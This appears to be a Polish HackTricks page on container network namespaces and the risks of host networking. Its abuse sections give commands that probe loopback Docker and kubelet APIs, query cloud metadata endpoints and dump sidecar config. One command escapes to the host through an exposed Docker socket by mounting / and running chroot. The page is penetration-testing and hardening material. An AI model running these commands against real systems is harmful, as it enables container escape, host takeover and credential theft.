# Przestrzeń nazw sieciowa

{{#include ../../../../../banners/hacktricks-training.md}}

## Przegląd

Przestrzeń nazw sieciowa izoluje zasoby związane z siecią, takie jak interfejsy, adresy IP, tablice routingu, stan ARP/neighbour, reguły firewalla, sockety, abstrakcyjną przestrzeń nazw socketów domeny UNIX oraz zawartość plików takich jak `/proc/net`. Dzięki temu kontener może mieć coś, co wygląda jak jego własny `eth0`, własne trasy lokalne i własne urządzenie loopback, nie posiadając rzeczywistego stosu sieciowego hosta.

Z punktu widzenia bezpieczeństwa ma to znaczenie, ponieważ izolacja sieciowa obejmuje znacznie więcej niż samo bindowanie portów. Prywatna przestrzeń nazw sieciowej ogranicza to, co workload może bezpośrednio obserwować lub rekonfigurować. Gdy ta przestrzeń nazw zostanie współdzielona z hostem, kontener może nagle uzyskać wgląd w listenery hosta, usługi lokalne hosta, abstrakcyjne endpointy AF_UNIX oraz punkty kontroli sieci, które nigdy nie miały być dostępne dla aplikacji.

## Działanie

Nowo utworzona przestrzeń nazw sieciowa zaczyna z pustym lub prawie pustym środowiskiem sieciowym, dopóki nie zostaną do niej dołączone interfejsy. Runtime'y kontenerów tworzą następnie lub podłączają wirtualne interfejsy, przypisują adresy i konfigurują trasy, aby workload miał oczekiwaną łączność. W deploymentach opartych na bridge'u zazwyczaj oznacza to, że kontener widzi interfejs oparty na veth, podłączony do bridge'a hosta. W Kubernetes wtyczki CNI obsługują równoważną konfigurację sieci Podów.

Ta architektura wyjaśnia, dlaczego `--network=host` lub `hostNetwork: true` stanowi tak dużą zmianę. Zamiast otrzymać przygotowany prywatny stos sieciowy, workload dołącza do rzeczywistego stosu sieciowego hosta.

## Lab

Możesz zobaczyć niemal pustą przestrzeń nazw sieciową za pomocą:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Możesz także porównać zwykłe kontenery z kontenerami korzystającymi z sieci hosta za pomocą:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Kontener korzystający z sieci hosta nie ma już własnego, izolowanego widoku socketów i interfejsów. Ta sama zmiana jest już istotna, zanim jeszcze zaczniesz sprawdzać, jakie capabilities ma proces.

## Użycie runtime

Docker i Podman zwykle tworzą prywatny network namespace dla każdego kontenera, chyba że zostaną skonfigurowane inaczej. Kubernetes zazwyczaj przydziela każdemu Podowi własny network namespace, współdzielony przez kontenery wewnątrz tego Poda, ale oddzielony od hosta. Oznacza to, że `127.0.0.1` zwykle odnosi się do całego Poda, a nie tylko do kontenera: listener nasłuchujący wyłącznie na localhost jest zazwyczaj dostępny z jego sidecarów i kontenerów równorzędnych. Systemy Incus/LXC również zapewniają rozbudowaną izolację opartą na network namespace, często z większą różnorodnością konfiguracji wirtualnej sieci.

Wspólna zasada mówi, że prywatna sieć jest domyślną granicą izolacji, natomiast sieć hosta stanowi jawne wyłączenie tej granicy.

## Błędne konfiguracje

Najważniejszą błędną konfiguracją jest po prostu współdzielenie network namespace hosta. Czasami robi się to ze względów wydajnościowych, na potrzeby monitoringu niskopoziomowego lub dla wygody, ale usuwa to jedną z najskuteczniejszych granic dostępnych dla kontenerów. Listenery lokalne dla hosta stają się dostępne w bardziej bezpośredni sposób, usługi dostępne wyłącznie przez localhost mogą stać się osiągalne, a capabilities takie jak `CAP_NET_ADMIN` lub `CAP_NET_RAW` stają się znacznie bardziej niebezpieczne, ponieważ operacje, które umożliwiają, są teraz wykonywane w środowisku sieciowym samego hosta.

Kolejnym problemem jest nadawanie zbyt szerokich capabilities związanych z siecią, nawet gdy network namespace jest prywatny. Prywatny namespace zapewnia pewną pomoc, ale nie sprawia, że raw sockets ani zaawansowana kontrola sieci stają się nieszkodliwe.

W Kubernetes `hostNetwork: true` zmienia również zakres, w jakim można polegać na segmentacji sieci na poziomie Poda. Dokumentacja Kubernetes wskazuje, że wiele network pluginów nie potrafi prawidłowo rozróżniać ruchu z Poda `hostNetwork` podczas dopasowywania `podSelector` / `namespaceSelector`, przez co traktuje go jak zwykły ruch węzła. Z punktu widzenia attackera oznacza to, że przejęty workload `hostNetwork` powinien być często traktowany jako foothold sieciowy na poziomie węzła, a nie jak zwykły Pod nadal ograniczony tymi samymi założeniami dotyczącymi polityk co workloady korzystające z overlay network.

## Nadużycie

W słabo izolowanych konfiguracjach attackerzy mogą przeglądać usługi nasłuchujące na hoście, uzyskiwać dostęp do endpointów zarządzania powiązanych wyłącznie z loopbackiem, sniffować lub zakłócać ruch — zależnie od konkretnych capabilities i środowiska — albo zmieniać routing i stan firewalla, jeśli obecne jest `CAP_NET_ADMIN`. W klastrze może to również ułatwiać lateral movement i rekonesans control plane.

Jeśli podejrzewasz korzystanie z sieci hosta, zacznij od potwierdzenia, że widoczne interfejsy i listenery należą do hosta, a nie do izolowanej sieci kontenera:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Usługi dostępne wyłącznie przez loopback często są pierwszym interesującym odkryciem:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstrakcyjne gniazda UNIX to kolejny łatwy do przeoczenia cel, ponieważ są ograniczone do przestrzeni nazw sieciowej, mimo że nie wyglądają jak listenery TCP/UDP i mogą nie istnieć jako ścieżki systemu plików w `/run`. Kontener korzystający z sieci hosta może więc odziedziczyć dostęp do przeznaczonych wyłącznie dla hosta kanałów sterowania, które nigdy nie zostały do niego zamontowane za pomocą bind mount:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Historycznym przykładem był błąd związany z ekspozycją abstract socket `containerd-shim`, ale szersza lekcja jest ważniejsza niż konkretny CVE: gdy workload dołączy do host network namespace, usługi abstract AF_UNIX również stają się częścią attack surface. Jeśli te sockety wyglądają na powiązane z runtime lub administracją, przejdź do [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

Jeśli dostępne są network capabilities, sprawdź, czy workload może przeglądać lub modyfikować widoczny stos sieciowy:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
We współczesnych kernelach host networking wraz z `CAP_NET_ADMIN` może również umożliwiać dostęp do ścieżki pakietów wykraczający poza proste zmiany w `iptables` / `nftables`. Qdiscs i filtry `tc` również mają zakres ograniczony do namespace, więc we współdzielonym host network namespace dotyczą interfejsów hosta, które kontener może zobaczyć. Jeśli dodatkowo dostępne jest `CAP_BPF`, istotne stają się również programy eBPF związane z siecią, takie jak loadery TC i XDP:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Ma to znaczenie, ponieważ attacker może mirrorować, przekierowywać, kształtować lub dropować traffic na poziomie interfejsu hosta, a nie tylko przepisywać reguły firewall. W prywatnym network namespace takie działania są ograniczone do widoku kontenera; we współdzielonym host namespace zaczynają wpływać na hosta.

W środowiskach klastrowych lub cloud host networking uzasadnia również szybki lokalny recon dotyczący metadanych i usług powiązanych z control plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
W Kubernetes pamiętaj, że przejęcie **dowolnego** kontenera w wielokontenerowym Podzie zapewnia również dostęp do listenerów localhost otwartych przez kontenery siostrzane i sidecary, ponieważ cały Pod współdzieli jedną przestrzeń nazw sieci. Jest to szczególnie istotne w przypadku service-mesh, observability oraz kontenerów pomocniczych, których interfejsy administracyjne lub debugowania są celowo dostępne tylko wewnątrz Podu, a nie w całym klastrze:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Traktuj „bound to localhost” jako **prywatne dla Poda**, a nie **prywatne dla kontenera**. Po przejęciu jednego kontenera w Podzie to założenie przestaje obowiązywać.

### Pełny przykład: Host Networking + dostęp do lokalnego runtime / Kubelet

Host networking nie zapewnia automatycznie uprawnień root na hoście, ale często ujawnia usługi, które celowo są dostępne wyłącznie z samego node'a. Jeśli jedna z tych usług jest słabo zabezpieczona, host networking staje się bezpośrednią ścieżką do privilege escalation.

Docker API na localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet na localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Wpływ:

- bezpośrednie przejęcie hosta, jeśli lokalne runtime API jest dostępne bez odpowiedniej ochrony
- rozpoznanie klastra lub ruch boczny, jeśli kubelet albo lokalne agenty są dostępne
- manipulowanie ruchem lub odmowa usługi w połączeniu z `CAP_NET_ADMIN`

## Sprawdzenia

Celem tych sprawdzeń jest ustalenie, czy proces ma prywatny stos sieciowy, jakie trasy i listenery są widoczne oraz czy widok sieci już przypomina widok hosta, zanim w ogóle przetestujesz capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Na co warto zwrócić uwagę:

- Jeśli `/proc/self/ns/net` i `/proc/1/ns/net` już wyglądają jak host, kontener może współdzielić hostową network namespace albo inną nieprywatną namespace.
- `lsns -t net` i `ip netns identify` są przydatne, gdy shell znajduje się już wewnątrz nazwanej lub trwałej namespace i chcesz skorelować ją z obiektami `/run/netns` po stronie hosta.
- `ss -lntup` jest szczególnie wartościowe, ponieważ ujawnia listenery dostępne wyłącznie przez loopback oraz lokalne endpointy zarządzania. `ss -xap` i `/proc/net/unix` uzupełniają widok abstract socket, którego nie obejmują standardowe wyszukiwania socketów w systemie plików.
- Routing, nazwy interfejsów, kontekst firewalla, stan `tc` oraz podpięcia eBPF stają się znacznie ważniejsze, jeśli obecne są `CAP_NET_ADMIN`, `CAP_NET_RAW` lub `CAP_BPF`.
- W Kubernetes nieudane rozwiązywanie nazw usług z poziomu Poda `hostNetwork` może po prostu oznaczać, że Pod nie używa `dnsPolicy: ClusterFirstWithHostNet`, a nie że usługa nie istnieje.
- W Podach zawierających wiele kontenerów listenery localhost należą do całej network namespace Poda, dlatego przed założeniem, że port dostępny wyłącznie przez loopback jest nieosiągalny z zaatakowanego kontenera, sprawdź sidecary i kontenery równorzędne.

Podczas analizy kontenera zawsze oceniaj network namespace razem z zestawem capabilities. Host networking wraz z silnymi capabilities sieciowymi oznacza zupełnie inny poziom ryzyka niż bridge networking z wąskim domyślnym zestawem capabilities.

## Referencje

- [Zastrzeżenia dotyczące Kubernetes NetworkPolicy i `hostNetwork`](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [`network_namespaces(7)` w Linuksie i izolacja abstract UNIX socket](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [Porada containerd: abstract Unix domain sockets ujawnione kontenerom korzystającym z host-network](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [Wymagania dotyczące tokenów eBPF i capabilities dla programów eBPF związanych z siecią](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
